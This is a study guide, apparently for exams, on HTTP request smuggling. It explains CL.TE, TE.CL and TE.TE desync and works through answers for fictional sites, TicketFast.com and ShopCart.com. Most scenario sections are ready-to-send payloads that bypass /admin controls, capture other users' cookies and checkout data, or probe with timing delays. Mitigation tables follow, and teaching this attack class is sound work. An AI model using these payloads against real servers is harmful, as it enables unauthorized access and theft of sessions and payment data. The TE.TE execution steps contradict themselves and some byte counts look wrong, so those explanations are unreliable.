# Theory

HTTP Request Smuggling is a vulnerability that arises when a **front-end server** (reverse proxy / load balancer) and a **back-end server** disagree on where one HTTP request ends and the next one begins. By crafting an ambiguous request, an attacker can "smuggle" a hidden partial request into the back-end's TCP connection, which gets prepended to the next legitimate user's request — hijacking it or bypassing security controls.

## Key Aspects

	Exploits disagreement between front-end and back-end HTTP parsing
	Targets the two body-length headers: Content-Length (CL) and Transfer-Encoding (TE)
	Types: CL.TE, TE.CL, and TE.TE

## How HTTP/1.1 Body Length Works

HTTP/1.1 provides two ways to declare request body length:

| Header | Description |
|---|---|
| `Content-Length` | Specifies exact byte count of the body |
| `Transfer-Encoding: chunked` | Body sent in chunks; each chunk prefixed with its hex size; terminated by a `0\r\n\r\n` chunk |

When both headers are present, **RFC 7230 says `Transfer-Encoding` takes priority and `Content-Length` must be ignored**. Smuggling happens when the two servers do not both follow this rule.

---

# Scenarios
## CL.TE (Front-end uses Content-Length, Back-end uses Transfer-Encoding)

A web application sits behind a reverse proxy. The proxy forwards requests to a single back-end server over a **persistent (keep-alive) TCP connection**.

```
User → [Front-end Proxy] → [Back-end Server]
```

The front-end reads `Content-Length` to decide where the request ends.
The back-end reads `Transfer-Encoding: chunked` to decide where the request ends.

### a. Predict the normal request flow

A normal POST request:
```
POST /search HTTP/1.1
Host: shop.test
Content-Length: 11

q=headphone
```

Front-end reads 11 bytes → forwards entire request → back-end processes it → returns results.

### b. Craft a CL.TE smuggling payload

```
POST /search HTTP/1.1
Host: shop.test
Content-Length: 30
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: x
```

**What the front-end sees:**
- Reads `Content-Length: 30` → reads exactly 30 bytes of body → forwards the entire block to back-end.

**What the back-end sees:**
- Reads `Transfer-Encoding: chunked` → reads first chunk: `0\r\n\r\n` → that is a zero-length chunk = **end of request**.
- The remaining bytes (`GET /admin HTTP/1.1\r\nX-Ignore: x`) are **left in the TCP buffer**.
- When the next legitimate user's request arrives, the back-end **prepends the leftover bytes** to it.

The next user's request effectively becomes:
```
GET /admin HTTP/1.1
X-Ignore: xGET /home HTTP/1.1
Host: shop.test
Cookie: session=victim_token
...
```

The back-end processes this as a request to `/admin` with the victim's cookies.

### c. Conditions required for CL.TE smuggling

1. Front-end and back-end share a **persistent TCP connection** (keep-alive).
2. **Front-end uses `Content-Length`** to determine request boundaries.
3. **Back-end uses `Transfer-Encoding: chunked`** to determine request boundaries.
4. The front-end **does not strip or reject** the `Transfer-Encoding` header before forwarding.
5. The attacker can **send raw HTTP/1.1 requests** with both headers present simultaneously.

### d. Craft a payload to poison the next user's request to `/admin`

```
POST /search HTTP/1.1
Host: shop.test
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Foo: bar
```

- Front-end reads 37 bytes → forwards the whole thing.
- Back-end reads chunked body → sees `0` (end of chunks) → treats the rest as the start of a new request.
- Next victim's request is prepended with `GET /admin HTTP/1.1\r\nX-Foo: bar` → victim's browser receives the admin page.

### e. Mitigation strategies for CL.TE

| Strategy | How it prevents smuggling |
|---|---|
| **Normalise ambiguous requests at the front-end** | Strip `Content-Length` when `Transfer-Encoding` is present before forwarding |
| **Reject requests with both headers** | Return `400 Bad Request` if both `CL` and `TE` are present |
| **Use HTTP/2 end-to-end** | HTTP/2 uses a single, unambiguous framing mechanism — no CL/TE conflict possible |
| **Disable keep-alive between front-end and back-end** | Each request uses a new connection; leftover bytes cannot contaminate the next request |

---

## TE.CL (Front-end uses Transfer-Encoding, Back-end uses Content-Length)

Same infrastructure, but now the roles are reversed:
- **Front-end** reads `Transfer-Encoding: chunked`
- **Back-end** reads `Content-Length`

### a. Predict the normal request flow

A normal chunked POST:
```
POST /search HTTP/1.1
Host: shop.test
Transfer-Encoding: chunked

b
q=headphone
0

```

Front-end reads chunks until `0` → forwards entire body → back-end reads `Content-Length` (or infers from forwarded data) → processes correctly.

### b. Craft a TE.CL smuggling payload

```
POST /search HTTP/1.1
Host: shop.test
Content-Length: 4
Transfer-Encoding: chunked

60
GET /admin HTTP/1.1
Host: shop.test
Content-Length: 15

smuggled-body
0

```

**What the front-end sees:**
- Reads `Transfer-Encoding: chunked` → reads chunk of size `0x60` (96 bytes) = the entire `GET /admin ...` block, then reads `0` = end of request → forwards it all.

**What the back-end sees:**
- Reads `Content-Length: 4` → reads only 4 bytes of body (`60\r\n`) → considers the request done.
- Remaining bytes (`GET /admin HTTP/1.1\r\n...`) are **left in the TCP buffer**.
- Prepended to the next user's request.

### c. Conditions required for TE.CL smuggling

1. Persistent TCP connection between front-end and back-end.
2. **Front-end uses `Transfer-Encoding`** to determine request boundaries.
3. **Back-end uses `Content-Length`** to determine request boundaries.
4. Front-end **does not strip `Content-Length`** before forwarding.
5. Attacker can send raw requests with both headers simultaneously.

### d. Craft a payload to capture another user's request body

```
POST /search HTTP/1.1
Host: shop.test
Content-Length: 4
Transfer-Encoding: chunked

71
POST /capture HTTP/1.1
Host: shop.test
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

data=
0

```

- Back-end reads `Content-Length: 4` → leaves the rest in the buffer.
- The next victim's request is appended after `data=` in the `/capture` POST body.
- The back-end stores it (e.g., in a search log or comment field) where the attacker can read it — revealing the victim's cookies and tokens.

### e. Mitigation strategies for TE.CL

| Strategy | How it prevents smuggling |
|---|---|
| **Upgrade to HTTP/2 end-to-end** | Eliminates CL/TE ambiguity entirely |
| **Reject requests with both `CL` and `TE` headers** | Refuse to process ambiguous requests at either server |
| **Back-end ignores `Content-Length` when `TE` is present** | Strictly follow RFC 7230 priority rules on both servers |
| **Use a WAF rule to block chunked encoding with CL** | Block requests that carry both headers at the perimeter |
| **Disable connection reuse (keep-alive) between proxy and back-end** | Eliminates the shared TCP buffer that makes smuggling possible |

---

# Exam-Style Questions

## Question 1 — TicketFast.com

An online ticket booking website **TicketFast.com** processes ticket reservations through a front-end load balancer and a back-end booking server. Due to inconsistent parsing of request headers between the two servers, the system is vulnerable to HTTP Request Smuggling.

Request format used by the server:
```
POST /bookTicket HTTP/1.1\r\n
Host: ticketfast.com\r\n
Connection: keep-alive\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: ______\r\n
Transfer-Encoding: ______\r\n
\r\n
<body>
```

The attacker wants the following content to reach the back-end server:
```
movie
300
POISON
```

### (a) CL.TE — Inject "POISON" into the back-end request stream

**How it works:**
- Front-end uses `Content-Length` → reads all bytes up to CL limit and forwards them.
- Back-end uses `Transfer-Encoding: chunked` → reads `0\r\n\r\n` as end of request, leaving the rest in the TCP buffer as a prefix to the next request.

**Byte count of smuggled body:**
`0\r\n` (3) + `\r\n` (2) + `movie\r\n` (7) + `300\r\n` (5) + `POISON` (6) = **23 bytes** → `Content-Length: 23`

**Complete request (CRLF shown explicitly):**
```
POST /bookTicket HTTP/1.1\r\n
Host: ticketfast.com\r\n
Connection: keep-alive\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 23\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
movie\r\n
300\r\n
POISON
```

**Execution flow:**
1. Front-end reads `Content-Length: 23` → forwards all 23 body bytes + headers to back-end.
2. Back-end reads `Transfer-Encoding: chunked` → encounters `0\r\n\r\n` = zero-length chunk = **end of this request**.
3. `movie\r\n300\r\nPOISON` remains in the TCP buffer.
4. The next legitimate user's request is received by the back-end **prefixed with `movie\r\n300\r\nPOISON`**, poisoning it.

### (b) TE.CL — Timing Delay Error on the Back-End

**How it works:**
- Front-end uses `Transfer-Encoding: chunked` → reads chunks until `0\r\n\r\n` and forwards only that.
- Back-end uses `Content-Length` → value is set **larger** than the forwarded body → back-end waits indefinitely for the remaining bytes → **timeout/delay**.

**Forwarded body:** `0\r\n\r\n` = 5 bytes. Set `Content-Length: 10` → back-end waits for 5 more bytes that never arrive.

**Complete request (CRLF shown explicitly):**
```
POST /bookTicket HTTP/1.1\r\n
Host: ticketfast.com\r\n
Connection: keep-alive\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 10\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
```

**Execution flow:**
1. Front-end reads `Transfer-Encoding: chunked` → sees `0\r\n\r\n` = end of request → forwards `0\r\n\r\n` (5 bytes) + headers.
2. Back-end reads `Content-Length: 10` → receives 5 bytes → **waits for 5 more bytes that never come**.
3. Connection hangs until the server times out → observable **timing delay confirms TE.CL vulnerability**.

### (c) TE.TE — Inject "POISON" using Obfuscated Transfer-Encoding

**How it works:**
- Both servers support `Transfer-Encoding: chunked`, so a plain TE header would be processed identically by both — no smuggling.
- The attacker sends **two `Transfer-Encoding` headers**, one of which is obfuscated (e.g., `x-chunked`).
- One server honours the valid `chunked` and terminates at `0\r\n\r\n`; the other server fails to recognise the obfuscated header and falls back to `Content-Length` — creating the same CL/TE split as before.

**Complete request (CRLF shown explicitly):**
```
POST /bookTicket HTTP/1.1\r\n
Host: ticketfast.com\r\n
Connection: keep-alive\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 23\r\n
Transfer-Encoding: chunked\r\n
Transfer-Encoding: x-chunked\r\n
\r\n
0\r\n
\r\n
movie\r\n
300\r\n
POISON
```

**Execution flow:**
1. Front-end processes `Transfer-Encoding: chunked` (first header) → reads `0\r\n\r\n` = end → forwards all 23 body bytes.
2. Back-end encounters `Transfer-Encoding: x-chunked` (unrecognised) → ignores TE → falls back to `Content-Length: 23` → reads all 23 bytes.
3. However, one of the two servers stops at `0\r\n\r\n` and treats the remainder as a new request → **`movie\r\n300\r\nPOISON` is left in the buffer**, poisoning the next request.

### (d) Two Impacts of HTTP Request Smuggling on TicketFast.com

**1. Bypassing Front-End Security Controls (Unauthorized Access)**
The front-end load balancer enforces access control — it blocks direct requests to `/admin` or `/internal` endpoints from external users. By smuggling a `GET /admin` request in the TCP buffer, the attacker causes the back-end to process it as the next user's request. Since the back-end trusts that the front-end has already validated it, the admin page is served — **completely bypassing the front-end's access control rules**. On TicketFast.com, this could expose booking management, user data, or revenue dashboards.

**2. Session Hijacking via Request Capture**
By smuggling a partial POST request body (e.g., `POST /capture ... Content-Length: 500\r\ndata=`), the attacker causes the next victim's full HTTP request — including their `Cookie: session=...` header — to be appended to the attacker's smuggled request body and stored in a field the attacker can read (search history, booking notes, etc.). This **leaks the victim's session token**, allowing the attacker to impersonate them and make fraudulent ticket bookings on their behalf.

---

## Question 2 — ShopCart.com

An online shopping website **ShopCart.com** processes order requests through a front-end proxy server and a back-end application server. An attacker exploits the header parsing mismatch using HTTP Request Smuggling.

Request format:
```
POST /checkout HTTP/1.1\r\n
Host: shopcart.com\r\n
Connection: keep-alive\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: ______\r\n
Transfer-Encoding: ______\r\n
\r\n
<body>
```

The attacker wants the following body to reach the back-end server:
```
book
500
SMUGGLED
```

### (a) CL.TE — Inject "SMUGGLED" into the back-end request stream

**Byte count of smuggled body:**
`0\r\n` (3) + `\r\n` (2) + `book\r\n` (6) + `500\r\n` (5) + `SMUGGLED` (8) = **24 bytes** → `Content-Length: 24`

**Complete request (CRLF shown explicitly):**
```
POST /checkout HTTP/1.1\r\n
Host: shopcart.com\r\n
Connection: keep-alive\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 24\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
book\r\n
500\r\n
SMUGGLED
```

**Execution flow:**
1. Front-end reads `Content-Length: 24` → forwards all 24 body bytes.
2. Back-end reads `Transfer-Encoding: chunked` → encounters `0\r\n\r\n` = end of request.
3. `book\r\n500\r\nSMUGGLED` stays in the TCP buffer.
4. Next user's request to `/checkout` is **prefixed with the smuggled content**, corrupting it.

### (b) TE.CL — Timing Delay Error on the Back-End

**Forwarded body:** `0\r\n\r\n` = 5 bytes. Set `Content-Length: 10` → back-end waits for 5 more bytes.

**Complete request (CRLF shown explicitly):**
```
POST /checkout HTTP/1.1\r\n
Host: shopcart.com\r\n
Connection: keep-alive\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 10\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
```

**Execution flow:**
1. Front-end reads `Transfer-Encoding: chunked` → `0\r\n\r\n` = end → forwards 5 bytes + headers.
2. Back-end reads `Content-Length: 10` → receives 5 bytes → **waits for 5 more that never arrive** → timeout.
3. The observable delay (e.g., 10–30 seconds before a 408/504 error) confirms the server is **vulnerable to TE.CL smuggling**.

### (c) TE.TE — Inject "SMUGGLED" using Obfuscated Transfer-Encoding

**Complete request (CRLF shown explicitly):**
```
POST /checkout HTTP/1.1\r\n
Host: shopcart.com\r\n
Connection: keep-alive\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 24\r\n
Transfer-Encoding: chunked\r\n
Transfer-Encoding: x-chunked\r\n
\r\n
0\r\n
\r\n
book\r\n
500\r\n
SMUGGLED
```

**Execution flow:**
1. Front-end processes the first `Transfer-Encoding: chunked` → stops at `0\r\n\r\n` → forwards all 24 body bytes.
2. Back-end sees `Transfer-Encoding: x-chunked` (unrecognised) → ignores TE → uses `Content-Length: 24` → reads all 24 bytes.
3. One server treats `book\r\n500\r\nSMUGGLED` as a new request prefix → **poisons the next request in the TCP stream**.

### (d) Two Impacts of HTTP Request Smuggling on ShopCart.com

**1. Bypassing Access Controls to Reach Internal Endpoints**
ShopCart.com's front-end proxy blocks requests to `/admin/orders` or `/internal/pricing` from external clients. By smuggling a `GET /admin/orders` request into the back-end TCP buffer, the attacker causes the back-end to service it as the next request — without the front-end ever seeing or blocking it. This could expose all customer orders, pricing rules, or discount codes to the attacker.

**2. Stealing Customer Credentials and Payment Data**
By smuggling a partial `POST /checkout` body with a large `Content-Length`, the attacker causes the next customer's full checkout request — containing name, address, credit card details, and session cookie — to be appended to the attacker's smuggled body and stored in a field the attacker can retrieve (e.g., an order note or product review field). This enables **direct theft of payment data** and account takeover on ShopCart.com.
